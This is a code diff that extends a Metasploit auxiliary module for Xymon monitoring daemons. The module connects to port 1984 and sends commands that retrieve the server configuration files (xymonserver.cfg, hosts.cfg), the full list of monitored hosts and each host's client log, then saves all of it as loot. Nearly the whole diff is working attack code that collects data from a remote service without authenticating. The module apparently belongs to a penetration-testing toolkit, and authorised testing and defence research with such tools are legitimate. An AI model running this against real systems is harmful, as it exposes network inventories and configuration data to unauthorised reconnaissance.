@@ -9,14 +9,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'        => 'Xymon Daemon Gather Client Host Information',
+      'Name'        => 'Xymon Daemon Gather Information',
       'Description' => %q{
-        This module retrieves a list of monitored hosts
-        from a Xymon daemon, and retrieves information
-        for each host.
+        This module retrieves information from a Xymon daemon service
+        (formerly Hobbit, based on Big Brother), including server
+        configuration information, a list of monitored hosts, and
+        associated client log for each host.
       },
-      'Author'      => [ 'bcoles' ],
-      'License'     => MSF_LICENSE
+      'Author'      => 'bcoles',
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          ['URL', 'https://xymon.sourceforge.net/'],
+          ['URL', 'https://en.wikipedia.org/wiki/Xymon'],
+          ['URL', 'https://en.wikipedia.org/wiki/Big_Brother_(software)']
+        ]
     )
     register_options [Opt::RPORT(1984)]
   end
@@ -25,7 +32,7 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status "Sending: #{cmd}"
     connect
     sock.puts cmd
-    sock.shutdown(1)
+    sock.shutdown(:WR)
     return sock.get(5)
   ensure
     disconnect
@@ -49,11 +56,49 @@ class MetasploitModule < Msf::Auxiliary
 
     xymond_service = report_service(host: rhost, port: rport, name: 'xymond', proto: 'tcp', info: version)
 
+    print_status 'Retrieving configuration files ...'
+
+    %w(xymonserver.cfg hosts.cfg).each do |config|
+      res = xymon_send("config #{config}").to_s
+
+      if res.blank?
+        print_error "Could not retrieve #{config}"
+        next
+      end
+
+      path = store_loot(
+        "xymon.config.#{config.sub(/\.cfg$/, '')}",
+        'text/plain',
+        target_host,
+        res,
+        nil,
+        "config #{config}",
+        xymond_service
+      )
+
+      print_good "#{config} (#{res.size} bytes) stored in #{path}"
+    end
+
+    print_status 'Retrieving host list ...'
+
     res = xymon_send('hostinfo').to_s
 
-    unless res
+    if res.blank?
       print_error 'Could not retrieve client host list'
+      return
     end
+
+    path = store_loot(
+      'xymon.hostinfo',
+      'text/plain',
+      target_host,
+      res,
+      nil,
+      'hostinfo',
+      xymond_service
+    )
+
+    print_good "Host info (#{res.size} bytes) stored in #{path}"
 
     hosts = res.each_line.map {|line| line.split('|').first}.reject {|host| host.blank?}
 
@@ -64,11 +109,18 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good "Found #{hosts.size} hosts"
 
+    print_status 'Retrieving client logs ...'
+
     hosts.each do |host|
       res = xymon_send("clientlog #{host}")
 
       unless res
-        print_error "Could not retrieve clientlog for #{host}"
+        print_error "Could not retrieve client log for #{host}"
+        next
+      end
+
+      if res.blank?
+        print_status "#{host} client log is empty"
         next
       end
 
@@ -81,7 +133,8 @@ class MetasploitModule < Msf::Auxiliary
         "clientlog #{host}",
         xymond_service
       )
-      print_status "Loot stored in #{path}"
+
+      print_good "#{host} client log (#{res.size} bytes) stored in #{path}"
     end
   rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
   rescue Timeout::Error => e
